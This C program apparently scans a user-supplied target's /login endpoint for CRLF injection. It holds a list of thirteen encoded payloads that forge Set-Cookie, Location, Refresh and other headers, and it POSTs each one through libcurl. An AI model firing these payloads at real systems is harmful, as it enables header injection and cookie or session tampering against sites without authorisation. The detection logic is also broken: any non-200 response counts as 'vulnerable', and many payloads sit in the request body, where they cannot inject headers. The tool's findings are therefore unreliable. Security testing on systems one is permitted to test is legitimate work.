#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

// Define maximum payload length
#define MAX_PAYLOAD_LEN 1024

// Array of payloads
const char *payloads[] = {
    // CRLF injection in Set-Cookie header
    "username=test%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A&password=test",

    // CRLF injection in Content-Length header
    "username=test%0D%0AContent-Length:%200%0D%0A&password=test",

    // CRLF injection in Refresh header
    "username=test%0D%0ARefresh:%200%0D%0A&password=test",

    // CRLF injection in Location header
    "username=test%0D%0ALocation:%20https://www.bbc.com%0D%0A&password=test",

    // CRLF injection in User-Agent header
    "User-Agent:%20Malicious%0D%0Ausername=test&password=test",

    // CRLF injection in Referer header
    "Referer:%20https://www.bbc.com%0D%0Ausername=test&password=test",

    // CRLF injection in Proxy header
    "Proxy:%20https://www.bbc.com%0D%0Ausername=test&password=test",

    // CRLF injection in Set-Cookie2 header
    "Set-Cookie2:%20maliciousCookie=maliciousValue%0D%0Ausername=test&password=test",

    // CRLF injection in any other custom header
    "CustomHeader:%20Injection%0D%0Ausername=test&password=test",

    // CRLF injection in HTTP request method
    "POST /login%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A HTTP/1.1%0D%0AHost: example.com%0D%0AContent-Length: 0%0D%0A%0D%0A",

    // CRLF injection in HTTP version
    "POST /login HTTP/1.1%0D%0AHost: example.com%0D%0AContent-Length: 0%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0A",

    // CRLF injection in MIME types
    "Content-Type: text/html%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0Ausername=test&password=test",

    // CRLF injection in HTML comment
    "<!--%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A-->",
    
    // Add more payloads here...
};

// Function to test for CRLF injection vulnerabilities
void test_crlf_injection(CURL *curl, const char *target_url, const char *payload) {
    char url[MAX_PAYLOAD_LEN];
    snprintf(url, sizeof(url), "%s/login", target_url);

    CURLcode res;
    char post_fields[MAX_PAYLOAD_LEN];
    snprintf(post_fields, sizeof(post_fields), "%s", payload);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields);

    res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
    } else {
        long response_code;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        if (response_code == 200) {
            printf("Not vulnerable to CRLF Injection: %s\n", payload);
        } else {
            printf("Vulnerable to CRLF Injection: %s\n", payload);
        }
    }
}

int main() {
    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Failed to initialize CURL\n");
        return 1;
    }

    char target_url[MAX_PAYLOAD_LEN];
    printf("Enter your target URL: ");
    fgets(target_url, sizeof(target_url), stdin);
    target_url[strcspn(target_url, "\n")] = 0;

    // Loop through payloads and test for vulnerabilities
    for (size_t i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
        test_crlf_injection(curl, target_url, payloads[i]);
    }

    curl_easy_cleanup(curl);
    return 0;
}
